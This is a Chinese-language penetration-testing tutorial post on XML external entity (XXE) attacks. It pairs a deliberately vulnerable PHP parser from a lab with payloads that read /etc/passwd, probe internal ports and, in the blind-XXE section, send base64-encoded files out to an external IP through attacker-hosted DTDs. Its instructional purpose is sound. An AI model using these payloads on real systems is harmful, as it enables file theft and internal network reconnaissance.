+++
date = "2017-12-09T23:02:22+08:00"
description = "XXE漏洞是针对使用XML交互的Web应用程序的攻击方法"
draft = false
tags = ["xml"]
title = "XXE漏洞"
topics = ["Pentest"]

+++

### 0x00 XXE
XML文件作为配置文件(spring、Struts2等)、文档结构说明文件(PDF、RSS等)、图片格式文件(SVG header)应用比较广泛

外部引用时可能会出现XXE漏洞，XXE漏洞是针对使用XML交互的Web应用程序的攻击方法

### 0x01 示例代码
实验环境：[https://github.com/vulhub/vulhub/tree/master/php/php_xxe](https://github.com/vulhub/vulhub/tree/master/php/php_xxe?_blank)  
simplexml_load_string.php
```
<?php
$data = file_get_contents('php://input');
$xml = simplexml_load_string($data);
echo $xml->name;
```

### 0x02 读取文件
* 外部引用读取passwd

```
<?xml version="1.0" encoding="utf-8"?> 
<!DOCTYPE xdsec [
  <!ELEMENT name ANY >
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>
  <name>&xxe;</name>
</root>
```

```
<?xml version="1.0" encoding="utf-8"?> 
<!DOCTYPE xdsec [
  <!ELEMENT name ANY >
  <!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=/etc/passwd">
]>
<root>
  <name>&xxe;</name>
</root>
```

* 外部引用dtd文件读取passwd

evil.dtd中的内容为：```<!ENTITY b SYSTEM "file:///etc/passwd">```
```
<?xml version="1.0" encoding="utf-8"?> 
<!DOCTYPE xdsec [
  <!ELEMENT name ANY >
  <!ENTITY % xxe SYSTEM "http://114.115.183.86/evil.dtd">
  %xxe;
]>
<root>
  <name>&b;</name>
</root>
```

### 0x03 端口探测
```
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE xdsec [
  <!ENTITY http SYSTEM 'http://10.11.11.20:3306/'>
]>
<root>
  <name>&http;</name>
</root>
```

### 0x04 Blind-XXE
* 方法一：

```
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE xdsec [
    <!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/issue">
    <!ENTITY % remote SYSTEM "http://114.115.183.86/wyb/evil.dtd">
    %remote;
    %send;
]>
```
evil.dtd内容：
```
<!ENTITY % all
"<!ENTITY &#x25; send SYSTEM 'http://114.115.183.86/?%file;'>"
>
%all;
```

* 方法二：

```xml
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE xdsec [
    <!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/hosts">
    <!ENTITY % remote SYSTEM "http://114.115.183.86/wyb/evil.xml">
    %remote;   <!--引用remote来将外部文件evil.xml引入到解释上下文中-->
    %xxe;   <!--执行%xxe，这时会检测到send实体，然后在root节点中引用send，就可以成功实现数据转发-->
]>
<root>&send;</root>
```
evil.xml内容：
```
<!ENTITY % xxe "<!ENTITY send SYSTEM 'http://114.115.183.86/a.php?content=%file;'>">
```


<br>
#### Reference(侵删)：
* [http://blog.csdn.net/u011721501/article/details/43775691](http://blog.csdn.net/u011721501/article/details/43775691?_blank)
* [https://security.tencent.com/index.php/blog/msg/69](https://security.tencent.com/index.php/blog/msg/69?_blank)
